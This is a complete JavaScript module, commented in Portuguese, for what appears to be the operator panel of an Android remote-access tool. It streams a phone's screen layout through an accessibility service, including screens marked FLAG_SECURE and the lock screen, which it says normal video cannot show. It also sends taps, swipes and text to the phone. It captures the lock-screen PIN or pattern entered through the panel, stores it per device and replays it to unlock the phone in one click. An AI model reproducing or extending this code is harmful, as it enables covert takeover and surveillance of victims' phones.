/* ================================================================
   EMULADOR WIREFRAME (Leitor de Tela) — js/wireframe-emulator.js
   ARQUIVO COMPLETO — substitua o conteúdo inteiro de
   js/wireframe-emulator.js por este.

   Renderiza em <canvas> a árvore de tela do Android (evento
   wireframe_frame) como caixas verdes em fundo escuro. Funciona em
   telas protegidas (FLAG_SECURE) e na tela de bloqueio onde o vídeo
   normal fica preto.

   Recursos:
     - Filtro por dispositivo: só renderiza frames do aparelho
       selecionado (aparelhoSelecionado), igual aos outros botões.
     - Cabeçalho dinâmico: "Leitor de tela | <aparelho> | FPS: X" +
       status em tempo real (DESBLOQUEADO verde / TELA BLOQUEADA laranja
       / TELA APAGADA vermelho) + tipo de bloqueio (capa/padrão/pin).
     - Controles: ▶ Play (frame 0 imediato), ⏸ Pause, FPS 1/2/5/10,
       💾 Salvar PNG, Zoom +/-.
     - Overlay central: "Clique em Play…", "Conectando…", "Sem resposta".
     - Canvas: caixas verdes (clicáveis = borda forte), textos dentro,
       9 bolinhas do padrão destacadas em verde, teclas de PIN marcadas.
     - Interação: clique = tap, arrasto = swipe.
     - Modo tela de bloqueio (automático quando bloqueado=true):
         * botão "Acordar / Deslizar (Swipe Up)"
         * desenho de padrão: arrastar ligando as 9 bolinhas OU clicar
           bolinha por bolinha + "✓ Enviar Padrão"; "✕ Limpar"
         * 💾 Salvar Sequência no localStorage (por dispositivo)
         * ⚡ Desbloquear (1 clique) = replay da sequência salva
           (wake_screen → swipe_up → pattern/pin)
     - Barra inferior: Recentes ☰ / Home ⌂ / Voltar ↪ + Send text
       (Enter envia).
   Uso:  WireframeEmulator.init({ socket: window.socket });
   ================================================================ */
(function () {
    'use strict';

    const $ = (id) => document.getElementById(id);
    let _socket = null;
    let _frame = null;              // último wireframe_frame do dispositivo ATIVO
    let _playing = false;
    let _fps = 5;
    let _zoom = 1.0;
    const BASE_W = 340;             // largura base de exibição (px)
    let _dragStart = null;          // {x, y} em coords REAIS do dispositivo
    let _dragging = false;
    // Modo padrão (tela de bloqueio): sequência de índices 1..9 selecionados
    let _patternSeq = [];           // índices (1..9) na ordem do desenho
    let _patternDragActive = false; // true enquanto arrasta ligando pontos
    let _lastUnlockAttempt = null;  // {modo:'padrao'|'pin', pontos:[{x,y}], digitos?:'1234'}
    let _pinDigitBuffer = '';       // dígitos PIN digitados via canvas (modo pin)

    // Chave do localStorage para sequência de desbloqueio salva (por dispositivo)
    const LS_CHAVE = (disp) => 'wf_unlock_' + (disp || 'default');

    // ── Dispositivo ativo (mesma regra dos outros botões do painel) ──
    function dispositivoAtivo() {
        try {
            if (typeof aparelhoSelecionado !== 'undefined' && aparelhoSelecionado) {
                return String(aparelhoSelecionado).replace(/\s*\(Flutuante\)\s*$/i, '').trim();
            }
        } catch (e) {}
        return (window.aparelhoSelecionado || (_frame && _frame.deviceId) || null);
    }

    function emitirControle(payload) {
        if (!_socket || !_socket.connected) return;
        payload.dispositivo = dispositivoAtivo();
        try { _socket.emit('wireframe_control_painel', payload); } catch (e) {}
    }

    // ── Renderização no canvas ──────────────────────────────────────
    function redimensionarCanvas() {
        const canvas = $('wireframe-canvas');
        if (!canvas || !_frame) return;
        const w = Math.round(BASE_W * _zoom);
        const h = Math.round(w * (_frame.height / _frame.width));
        canvas.width = w;
        canvas.height = h;
        canvas.style.width = w + 'px';
        canvas.style.height = h + 'px';
    }

    function escala() {
        const canvas = $('wireframe-canvas');
        if (!canvas || !_frame) return 1;
        return canvas.width / _frame.width;
    }

    function desenharFrame() {
        const canvas = $('wireframe-canvas');
        if (!canvas || !_frame) return;
        const ctx = canvas.getContext('2d');
        const w = canvas.width, h = canvas.height;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = '#181818';
        ctx.fillRect(0, 0, w, h);

        const s = escala();
        const nos = _frame.nos || [];
        ctx.textBaseline = 'top';

        // 1) Caixas dos nós
        for (let i = 0; i < nos.length; i++) {
            const n = nos[i];
            if (!n || n.length < 6) continue;
            const l = n[0], t = n[1], r = n[2], b = n[3];
            const clicavel = (n[4] === 1 || n[4] === true);
            const texto = n[5];
            const x = Math.round(l * s), y = Math.round(t * s);
            const nw = Math.round((r - l) * s), nh = Math.round((b - t) * s);
            if (nw < 1 || nh < 1) continue;

            ctx.strokeStyle = clicavel ? '#2ecc71' : 'rgba(46,204,113,0.40)';
            ctx.lineWidth = clicavel ? 1.4 : 0.7;
            ctx.strokeRect(x + 0.5, y + 0.5, nw, nh);

            if (texto && nw > 28 && nh > 8) {
                ctx.fillStyle = clicavel ? '#7dffb0' : '#5aa87a';
                ctx.font = (clicavel ? 'bold ' : '') + '9px monospace';
                const maxChars = Math.max(3, Math.floor(nw / 5));
                const txt = String(texto).length > maxChars
                    ? String(texto).slice(0, maxChars - 1) + '…'
                    : String(texto);
                ctx.fillText(txt, x + 2, y + 1);
            }
        }

        // 2) 9 bolinhas da senha padrão (destacadas em verde neon)
        const pontos = (_frame.padrao && _frame.padrao.pontos) || [];
        if (pontos.length === 9) {
            const cell = Math.max(8, Math.round(((_frame.padrao.bounds && _frame.padrao.bounds[2] - _frame.padrao.bounds[0]) || 300) / 3 * s));
            const raio = Math.max(6, Math.min(14, cell * 0.28));
            // Linha conectando a sequência atual (durante o desenho)
            if (_patternSeq.length >= 2) {
                ctx.strokeStyle = 'rgba(46,204,113,0.85)';
                ctx.lineWidth = 2.5;
                ctx.beginPath();
                for (let k = 0; k < _patternSeq.length; k++) {
                    const pt = pontos[_patternSeq[k] - 1];
                    if (!pt) continue;
                    const px = pt.x * s, py = pt.y * s;
                    if (k === 0) ctx.moveTo(px, py); else ctx.lineTo(px, py);
                }
                ctx.stroke();
            }
            for (let i = 0; i < pontos.length; i++) {
                const pt = pontos[i];
                const px = pt.x * s, py = pt.y * s;
                const selecionado = _patternSeq.indexOf(pt.i) >= 0;
                ctx.beginPath();
                ctx.arc(px, py, raio, 0, Math.PI * 2);
                ctx.fillStyle = selecionado ? '#2ecc71' : 'rgba(46,204,113,0.18)';
                ctx.fill();
                ctx.strokeStyle = selecionado ? '#a8ffcd' : '#2ecc71';
                ctx.lineWidth = selecionado ? 2 : 1.2;
                ctx.stroke();
                ctx.fillStyle = selecionado ? '#0d0d0d' : '#7dffb0';
                ctx.font = 'bold 9px monospace';
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                ctx.fillText(String(pt.i), px, py);
            }
            ctx.textAlign = 'left';
            ctx.textBaseline = 'top';
        }

        // 3) Rodapé: dispositivo + resolução
        ctx.fillStyle = 'rgba(46,204,113,0.6)';
        ctx.font = '10px monospace';
        ctx.fillText(`${_frame.deviceId || ''}  ${_frame.width}x${_frame.height}`, 4, h - 14);
    }

    // ── Recepção de frame (com filtro por dispositivo) ──────────────
    function aoReceberFrame(payload) {
        if (!payload) return;
        const ativo = dispositivoAtivo();
        // Filtro rígido: só renderiza frames DO aparelho selecionado
        // (igual ao filtro de frames JPEG do vídeo). Se nenhum aparelho
        // selecionado, aceita o primeiro que chegar (fallback).
        if (ativo) {
            const origem = payload.deviceId || payload.dispositivo || '';
            if (origem && origem !== ativo) return; // frame de outro aparelho -> ignora
        }
        _frame = payload;
        if (payload.fps) _fps = parseInt(payload.fps, 10) || _fps;
        redimensionarCanvas();
        desenharFrame();
        atualizarCabecalho();
        atualizarBarraBloqueio();
        const painel = $('wireframe-emulator-panel');
        if (painel) painel.classList.add('ativo');
    }

    // ── Cabeçalho + status + overlay ────────────────────────────────
    function atualizarCabecalho() {
        const el = $('wf-device-label');
        if (el) el.textContent = dispositivoAtivo() || '—';
        const fpsEl = $('wf-fps-label');
        if (fpsEl) fpsEl.textContent = _fps;
        const btnPlay = $('wf-btn-play');
        if (btnPlay) {
            btnPlay.textContent = _playing ? '⏸ Pause' : '▶ Play';
            btnPlay.classList.toggle('wf-playing', _playing);
        }
        const zoomEl = $('wf-zoom-label');
        if (zoomEl) zoomEl.textContent = Math.round(_zoom * 100) + '%';

        // Status em tempo real (DESBLOQUEADO / TELA BLOQUEADA / TELA APAGADA)
        const status = $('wf-status');
        if (status && _frame) {
            if (_frame.telaApagada) {
                status.textContent = 'TELA APAGADA';
                status.className = 'wf-status wf-off';
            } else if (_frame.bloqueado) {
                const tipo = _frame.tipoBloqueio || 'capa';
                const rotulo = { capa: 'TELA BLOQUEADA (Capa)', padrao: 'TELA BLOQUEADA (Padrão)', pin: 'TELA BLOQUEADA (PIN/Senha)', nenhum: 'TELA BLOQUEADA' }[tipo] || 'TELA BLOQUEADA';
                status.textContent = rotulo;
                status.className = 'wf-status wf-locked';
            } else {
                status.textContent = 'DESBLOQUEADO';
                status.className = 'wf-status wf-unlocked';
            }
        } else if (status) {
            status.textContent = 'AGUARDANDO';
            status.className = 'wf-status';
        }

        // Overlay central (mensagem de estado)
        const overlay = $('wf-overlay');
        if (overlay) {
            let msg = '';
            if (!_playing) {
                msg = 'Clique em ▶ Play para iniciar a leitura de tela…';
            } else if (!_frame) {
                msg = 'Conectando ao serviço de acessibilidade…';
            } else {
                const idade = Date.now() - (_frame.timestamp || 0);
                if (idade > 6000) msg = 'Sem resposta do aparelho… (verifique a conexão / acessibilidade)';
            }
            overlay.textContent = msg;
            overlay.style.display = msg ? 'flex' : 'none';
        }
    }

    // ── Barra de tela de bloqueio (visível só quando bloqueado) ─────
    function atualizarBarraBloqueio() {
        const bar = $('wf-lock-bar');
        if (!bar) return;
        const bloqueado = !!( _frame && _frame.bloqueado);
        bar.style.display = bloqueado ? 'flex' : 'none';
        if (!bloqueado) { _patternSeq = []; _pinDigitBuffer = ''; return; }

        const info = $('wf-lock-info');
        const tipo = (_frame && _frame.tipoBloqueio) || 'capa';
        if (info) {
            info.textContent = {
                capa: 'Tela de capa — use "Acordar / Deslizar"',
                padrao: 'Senha padrão — arraste ligando as 9 bolinhas (ou clique uma a uma)',
                pin: 'PIN/Senha — toque nos dígitos no canvas ou use Send text',
                nenhum: 'Tela bloqueada'
            }[tipo] || 'Tela bloqueada';
        }

        const temPadrao = (tipo === 'padrao') &&
            (_frame.padrao && _frame.padrao.pontos && _frame.padrao.pontos.length === 9);
        const mostrarSeq = $('wf-pattern-seq');
        const btnSend = $('wf-btn-pattern-send');
        const btnClear = $('wf-btn-pattern-clear');
        if (mostrarSeq) mostrarSeq.style.display = temPadrao ? 'inline-block' : 'none';
        if (btnSend) btnSend.style.display = temPadrao ? 'inline-block' : 'none';
        if (btnClear) btnClear.style.display = temPadrao ? 'inline-block' : 'none';
        if (mostrarSeq) {
            mostrarSeq.textContent = 'Padrão: ' + (_patternSeq.length ? _patternSeq.join(' → ') : '—');
        }

        // Botão salvar: aparece após qualquer tentativa de desbloqueio
        const btnSave = $('wf-btn-save-unlock');
        if (btnSave) btnSave.style.display = _lastUnlockAttempt ? 'inline-block' : 'none';

        // Botão auto (1 clique): aparece se há sequência salva no localStorage
        const btnAuto = $('wf-btn-auto-unlock');
        const salvo = carregarSequenciaSalva();
        if (btnAuto) btnAuto.style.display = salvo ? 'inline-block' : 'none';
    }

    function carregarSequenciaSalva() {
        try {
            const raw = localStorage.getItem(LS_CHAVE(dispositivoAtivo()));
            return raw ? JSON.parse(raw) : null;
        } catch (e) { return null; }
    }

    function salvarSequenciaAtual() {
        if (!_lastUnlockAttempt) return;
        try {
            localStorage.setItem(LS_CHAVE(dispositivoAtivo()), JSON.stringify(_lastUnlockAttempt));
            alert('Sequência de desbloqueio salva para ' + (dispositivoAtivo() || 'este aparelho') + '.\nPróximas vezes use ⚡ Desbloquear (1 clique).');
        } catch (e) { alert('Erro ao salvar: ' + e.message); }
        atualizarBarraBloqueio();
    }

    // Replay da sequência salva: wake_screen -> swipe_up -> pattern/pin
    function desbloquearEm1Clique() {
        const seq = carregarSequenciaSalva();
        if (!seq) return;
        emitirControle({ comando: 'wake_screen' });
        setTimeout(() => {
            emitirControle({ comando: 'swipe_up' });
            setTimeout(() => {
                if (seq.modo === 'padrao' && seq.pontos && seq.pontos.length >= 2) {
                    emitirControle({ comando: 'pattern', pontos: seq.pontos });
                } else if (seq.modo === 'pin' && seq.digitos) {
                    emitirControle({ comando: 'pin', digitos: seq.digitos });
                } else if (seq.modo === 'pin' && seq.pontos) {
                    // replay por toques sequenciais (250ms entre cada, JS-side)
                    seq.pontos.forEach((p, i) => {
                        setTimeout(() => emitirControle({ comando: 'tap', x: p.x, y: p.y }), i * 250);
                    });
                }
            }, 1400);
        }, 700);
    }

    // ── Interação no canvas (tap / swipe / padrão / PIN) ────────────
    function coordsReais(evt) {
        const canvas = $('wireframe-canvas');
        if (!canvas || !_frame) return null;
        const rect = canvas.getBoundingClientRect();
        const px = (evt.clientX - rect.left) * (canvas.width / rect.width);
        const py = (evt.clientY - rect.top) * (canvas.height / rect.height);
        const s = escala();
        return { x: Math.round(px / s), y: Math.round(py / s) };
    }

    // Hit-test: qual bolinha do padrão (1..9) está sob o ponto real?
    function pontoPadraoEm(realX, realY) {
        const pontos = (_frame && _frame.padrao && _frame.padrao.pontos) || [];
        if (pontos.length !== 9) return null;
        const bounds = _frame.padrao.bounds || [0, 0, 300, 300];
        const cell = Math.max(20, (bounds[2] - bounds[0]) / 3);
        const raio = cell * 0.45;
        for (let i = 0; i < pontos.length; i++) {
            const pt = pontos[i];
            if (Math.hypot(pt.x - realX, pt.y - realY) <= raio) return pt.i;
        }
        return null;
    }

    // Hit-test: qual dígito do PIN está sob o ponto real?
    function digitoPinEm(realX, realY) {
        const teclas = (_frame && _frame.pinTeclas) || [];
        for (let i = 0; i < teclas.length; i++) {
            const t = teclas[i];
            if (Math.hypot(t.x - realX, t.y - realY) < 40) return t.d;
        }
        return null;
    }

    function aoMouseDown(evt) {
        const p = coordsReais(evt);
        if (!p) return;
        _dragStart = p;
        _dragging = true;
        // Modo padrão: inicia desenho se clicou em uma bolinha
        if (_frame && _frame.bloqueado && _frame.tipoBloqueio === 'padrao') {
            const idx = pontoPadraoEm(p.x, p.y);
            if (idx !== null) {
                _patternDragActive = true;
                if (_patternSeq.indexOf(idx) < 0) _patternSeq.push(idx);
                desenharFrame();
                atualizarBarraBloqueio();
            }
        }
    }

    function aoMouseMove(evt) {
        if (!_dragging || !_dragStart) return;
        // Modo padrão: durante o arrasto, adiciona bolinhas sob o cursor
        if (_patternDragActive && _frame && _frame.bloqueado) {
            const p = coordsReais(evt);
            if (p) {
                const idx = pontoPadraoEm(p.x, p.y);
                if (idx !== null && _patternSeq.indexOf(idx) < 0) {
                    _patternSeq.push(idx);
                    desenharFrame();
                    atualizarBarraBloqueio();
                }
            }
        }
    }

    function aoMouseUp(evt) {
        if (!_dragging) return;
        _dragging = false;
        if (!_dragStart) return;
        const fim = coordsReais(evt);
        const inicio = _dragStart;
        _dragStart = null;

        // --- Modo padrão (tela de bloqueio) ---
        if (_patternDragActive) {
            _patternDragActive = false;
            if (_patternSeq.length >= 2) {
                // Envia o padrão imediatamente ao final do arrasto
                enviarPadraoAtual();
            }
            // Se foi um clique curto em uma bolinha (click-by-click),
            // só adiciona à sequência (já feito no mousedown) — usuário
            // confirma com "✓ Enviar Padrão".
            return;
        }
        if (!fim) return;

        const dx = Math.abs(fim.x - inicio.x), dy = Math.abs(fim.y - inicio.y);

        // --- Modo PIN: toque em uma tecla numérica ---
        if (_frame && _frame.bloqueado && _frame.tipoBloqueio === 'pin' && dx <= 25 && dy <= 25) {
            const dig = digitoPinEm(inicio.x, inicio.y);
            if (dig !== null) {
                emitirControle({ comando: 'tap', x: inicio.x, y: inicio.y });
                _pinDigitBuffer += dig;
                _lastUnlockAttempt = { modo: 'pin', digitos: _pinDigitBuffer, pontos: null };
                atualizarBarraBloqueio();
                return;
            }
        }

        // --- Comportamento normal: swipe ou tap ---
        if (dx > 25 || dy > 25) {
            emitirControle({ comando: 'swipe', x1: inicio.x, y1: inicio.y, x2: fim.x, y2: fim.y });
        } else {
            emitirControle({ comando: 'tap', x: inicio.x, y: inicio.y });
        }
    }

    function enviarPadraoAtual() {
        if (_patternSeq.length < 2) return;
        const pontos = (_frame && _frame.padrao && _frame.padrao.pontos) || [];
        const coords = [];
        for (let i = 0; i < _patternSeq.length; i++) {
            const pt = pontos[_patternSeq[i] - 1];
            if (pt) coords.push({ x: pt.x, y: pt.y });
        }
        if (coords.length >= 2) {
            emitirControle({ comando: 'pattern', pontos: coords });
            _lastUnlockAttempt = { modo: 'padrao', pontos: coords };
        }
        atualizarBarraBloqueio();
    }

    function limparPadrao() {
        _patternSeq = [];
        _pinDigitBuffer = '';
        desenharFrame();
        atualizarBarraBloqueio();
    }

    // ── Controles ───────────────────────────────────────────────────
    function alternarPlay() {
        if (_playing) {
            _playing = false;
            emitirControle({ comando: 'pause' });
        } else {
            _playing = true;
            _frame = null; // força overlay "Conectando…"
            emitirControle({ comando: 'play', fps: _fps }); // frame 0 imediato no aparelho
        }
        atualizarCabecalho();
    }
    function aoMudarFps(valor) {
        _fps = parseInt(valor, 10) || 5;
        if (_playing) emitirControle({ comando: 'fps', valor: _fps });
        atualizarCabecalho();
    }
    function salvarPng() {
        const canvas = $('wireframe-canvas');
        if (!canvas) return;
        const a = document.createElement('a');
        a.download = 'wireframe-' + (dispositivoAtivo() || 'frame') + '-' + Date.now() + '.png';
        a.href = canvas.toDataURL('image/png');
        a.click();
    }
    function aplicarZoom(fator) {
        _zoom = Math.max(0.5, Math.min(3, _zoom * fator));
        redimensionarCanvas();
        desenharFrame();
        atualizarCabecalho();
    }
    function enviarTexto() {
        const input = $('wf-send-text');
        const texto = input ? input.value.trim() : '';
        if (!texto) return;
        emitirControle({ comando: 'send_text', texto: texto });
        if (input) input.value = '';
    }

    // ── Colar (Ctrl+V) do notebook direto na tela espelhada ─────────
    // Pega o texto que o usuário copiou (Ctrl+C) no PC e envia para o
    // campo que estiver focado no aparelho, INSERINDO no cursor (não
    // apaga o que já estava digitado).
    function colarTextoNoAparelho(texto) {
        if (!texto) return;
        emitirControle({ comando: 'send_text', texto: String(texto), inserir: true });
        mostrarToast('Colado: ' + (texto.length > 40 ? texto.slice(0, 40) + '…' : texto));
    }
    // Aviso rápido no canto do painel (não conflita com o overlay de status).
    let _toastTimer = null;
    function mostrarToast(msg) {
        const painel = $('wireframe-emulator-panel') || document.body;
        let t = $('wf-toast');
        if (!t) {
            t = document.createElement('div');
            t.id = 'wf-toast';
            t.style.cssText = 'position:absolute;bottom:10px;left:50%;transform:translateX(-50%);' +
                'background:rgba(20,20,20,.92);color:#fff;padding:6px 12px;border-radius:6px;' +
                'font-size:12px;z-index:9999;pointer-events:none;max-width:90%;white-space:nowrap;' +
                'overflow:hidden;text-overflow:ellipsis;';
            if (getComputedStyle(painel).position === 'static') painel.style.position = 'relative';
            painel.appendChild(t);
        }
        t.textContent = msg;
        t.style.display = 'block';
        if (_toastTimer) clearTimeout(_toastTimer);
        _toastTimer = setTimeout(() => { t.style.display = 'none'; }, 1600);
    }
    // Evento nativo de "paste": funciona sem pedir permissão, desde que a
    // tela (canvas) esteja focada — por isso focamos o canvas no clique.
    function aoColar(e) {
        const dados = (e.clipboardData || window.clipboardData);
        if (!dados) return;
        const texto = dados.getData('text');
        if (texto) {
            e.preventDefault();
            colarTextoNoAparelho(texto);
        }
    }
    // Fallback: Ctrl/Cmd+V via API assíncrona de área de transferência
    // (usado quando o evento 'paste' não dispara; exige contexto seguro).
    function aoTeclarColar(e) {
        const ctrl = e.ctrlKey || e.metaKey;
        if (ctrl && (e.key === 'v' || e.key === 'V')) {
            if (navigator.clipboard && navigator.clipboard.readText) {
                e.preventDefault();
                navigator.clipboard.readText()
                    .then(colarTextoNoAparelho)
                    .catch(() => {/* sem permissão: o evento 'paste' cobre o caso */});
            }
        }
    }

    // Quando o usuário troca de dispositivo no painel: reseta estado
    function aoTrocarDispositivo() {
        _frame = null;
        _patternSeq = [];
        _pinDigitBuffer = '';
        _lastUnlockAttempt = null;
        const overlay = $('wf-overlay');
        if (overlay) overlay.style.display = 'flex';
        desenharFrame();
        atualizarCabecalho();
        atualizarBarraBloqueio();
    }

    // ── Inicialização pública ───────────────────────────────────────
    function init(opcoes) {
        _socket = (opcoes && opcoes.socket) || window.socket || null;
        if (_socket) {
            _socket.on('wireframe_frame', aoReceberFrame);
        }
        // Se o painel HTML ainda não foi colado na index, injeta na hora.
        if (!$('wireframe-emulator-panel')) injetarHtml();

        // Botões de controle
        const btnPlay = $('wf-btn-play');
        if (btnPlay) btnPlay.addEventListener('click', alternarPlay);
        const btnPng = $('wf-btn-png');
        if (btnPng) btnPng.addEventListener('click', salvarPng);
        const btnZoomIn = $('wf-zoom-in');
        if (btnZoomIn) btnZoomIn.addEventListener('click', () => aplicarZoom(1.25));
        const btnZoomOut = $('wf-zoom-out');
        if (btnZoomOut) btnZoomOut.addEventListener('click', () => aplicarZoom(0.8));
        const selFps = $('wf-fps-select');
        if (selFps) selFps.addEventListener('change', (e) => aoMudarFps(e.target.value));

        // Barra de bloqueio
        const btnSwipeUp = $('wf-btn-swipe-up');
        if (btnSwipeUp) btnSwipeUp.addEventListener('click', () => {
            emitirControle({ comando: 'wake_screen' });
            setTimeout(() => emitirControle({ comando: 'swipe_up' }), 600);
        });
        const btnPatternSend = $('wf-btn-pattern-send');
        if (btnPatternSend) btnPatternSend.addEventListener('click', enviarPadraoAtual);
        const btnPatternClear = $('wf-btn-pattern-clear');
        if (btnPatternClear) btnPatternClear.addEventListener('click', limparPadrao);
        const btnSave = $('wf-btn-save-unlock');
        if (btnSave) btnSave.addEventListener('click', salvarSequenciaAtual);
        const btnAuto = $('wf-btn-auto-unlock');
        if (btnAuto) btnAuto.addEventListener('click', desbloquearEm1Clique);

        // Navegação Android
        const bindNav = (id, comando) => {
            const el = $(id);
            if (el) el.addEventListener('click', () => emitirControle({ comando: comando }));
        };
        bindNav('wf-nav-recents', 'recents');
        bindNav('wf-nav-home', 'home');
        bindNav('wf-nav-back', 'back');

        // Send text (botão + Enter)
        const btnSend = $('wf-btn-send-text');
        if (btnSend) btnSend.addEventListener('click', enviarTexto);
        const input = $('wf-send-text');
        if (input) input.addEventListener('keydown', (e) => { if (e.key === 'Enter') enviarTexto(); });

        // Canvas: tap / swipe / padrão / PIN (mouse + touch)
        const canvas = $('wireframe-canvas');
        if (canvas) {
            // Torna a tela "focável" para receber Ctrl+V. Ao clicar nela,
            // damos foco; então o navegador entrega o evento 'paste' aqui.
            canvas.tabIndex = 0;
            canvas.style.outline = 'none';
            canvas.addEventListener('mousedown', () => { try { canvas.focus(); } catch (e) {} });
            canvas.addEventListener('paste', aoColar);
            canvas.addEventListener('keydown', aoTeclarColar);
            // Também aceita colar no painel inteiro (caso o foco esteja fora
            // do canvas mas dentro do emulador).
            const painel = $('wireframe-emulator-panel');
            if (painel) painel.addEventListener('paste', aoColar);
            canvas.addEventListener('mousedown', aoMouseDown);
            window.addEventListener('mousemove', aoMouseMove);
            window.addEventListener('mouseup', aoMouseUp);
            canvas.addEventListener('mouseleave', () => { /* não reseta _dragStart: mouseup global cuida */ });
            // Touch (mobile)
            canvas.addEventListener('touchstart', (e) => { if (e.touches[0]) { e.preventDefault(); aoMouseDown(e.touches[0]); } }, { passive: false });
            canvas.addEventListener('touchmove', (e) => { if (e.touches[0]) { e.preventDefault(); aoMouseMove(e.touches[0]); } }, { passive: false });
            canvas.addEventListener('touchend', (e) => { const t = e.changedTouches && e.changedTouches[0]; if (t) aoMouseUp(t); });
        }

        // Atualiza cabeçalho/overlay periodicamente (acompanha troca de
        // dispositivo e detecta "sem resposta" por idade do frame).
        let ultimoDisp = dispositivoAtivo();
        setInterval(() => {
            const dispAgora = dispositivoAtivo();
            if (dispAgora !== ultimoDisp) { ultimoDisp = dispAgora; aoTrocarDispositivo(); }
            atualizarCabecalho();
        }, 800);
        atualizarCabecalho();
        console.log('[WireframeEmulator] inicializado (com filtro por dispositivo + tela de bloqueio + padrão interativo).');
    }

    // Fallback: se o HTML do painel não foi colado na index, injeta via JS.
    function injetarHtml() {
        const div = document.createElement('div');
        div.id = 'wireframe-emulator-panel';
        div.className = 'ativo';
        div.innerHTML =
            '<div class="wf-header">' +
            '  <span class="wf-title">Leitor de tela | <span class="wf-device" id="wf-device-label">—</span> | FPS: <span id="wf-fps-label">5</span></span>' +
            '  <span class="wf-status" id="wf-status">AGUARDANDO</span>' +
            '  <select class="wf-fps-select" id="wf-fps-select">' +
            '    <option value="1">1 FPS</option><option value="2">2 FPS</option>' +
            '    <option value="5" selected>5 FPS</option><option value="10">10 FPS</option>' +
            '  </select>' +
            '</div>' +
            '<div class="wf-controls">' +
            '  <button class="wf-btn" id="wf-btn-play">▶ Play</button>' +
            '  <button class="wf-btn" id="wf-btn-png">💾 Salvar PNG</button>' +
            '  <button class="wf-btn wf-zoom" id="wf-zoom-out">−</button>' +
            '  <span class="wf-zoom-label" id="wf-zoom-label">100%</span>' +
            '  <button class="wf-btn wf-zoom" id="wf-zoom-in">+</button>' +
            '</div>' +
            '<div class="wf-lock-bar" id="wf-lock-bar" style="display:none;">' +
            '  <button class="wf-btn wf-lock-btn" id="wf-btn-swipe-up">⏶ Acordar / Deslizar (Swipe Up)</button>' +
            '  <span class="wf-lock-info" id="wf-lock-info">Tela bloqueada</span>' +
            '  <span class="wf-pattern-seq" id="wf-pattern-seq" style="display:none;">Padrão: —</span>' +
            '  <button class="wf-btn wf-lock-btn" id="wf-btn-pattern-send" style="display:none;">✓ Enviar Padrão</button>' +
            '  <button class="wf-btn wf-lock-btn" id="wf-btn-pattern-clear" style="display:none;">✕ Limpar</button>' +
            '  <button class="wf-btn wf-lock-btn" id="wf-btn-save-unlock" style="display:none;">💾 Salvar Sequência</button>' +
            '  <button class="wf-btn wf-lock-btn wf-auto" id="wf-btn-auto-unlock" style="display:none;">⚡ Desbloquear (1 clique)</button>' +
            '</div>' +
            '<div class="wf-canvas-wrap">' +
            '  <canvas id="wireframe-canvas" width="340" height="620"></canvas>' +
            '  <div class="wf-overlay" id="wf-overlay">Clique em ▶ Play para iniciar a leitura de tela…</div>' +
            '</div>' +
            '<div class="wf-nav">' +
            '  <button class="wf-nav-btn" id="wf-nav-recents" title="Recentes">☰</button>' +
            '  <button class="wf-nav-btn" id="wf-nav-home" title="Home">⌂</button>' +
            '  <button class="wf-nav-btn" id="wf-nav-back" title="Voltar">↪</button>' +
            '  <input class="wf-send-text" id="wf-send-text" placeholder="Send text… (Enter para enviar)">' +
            '  <button class="wf-send-btn" id="wf-btn-send-text">Enviar</button>' +
            '</div>';
        const ref = document.querySelector('#specific-device-lock-panel') || document.body;
        if (ref && ref.parentNode) ref.parentNode.insertBefore(div, ref.nextSibling);
        else document.body.appendChild(div);
    }

    window.WireframeEmulator = { init: init };
})();
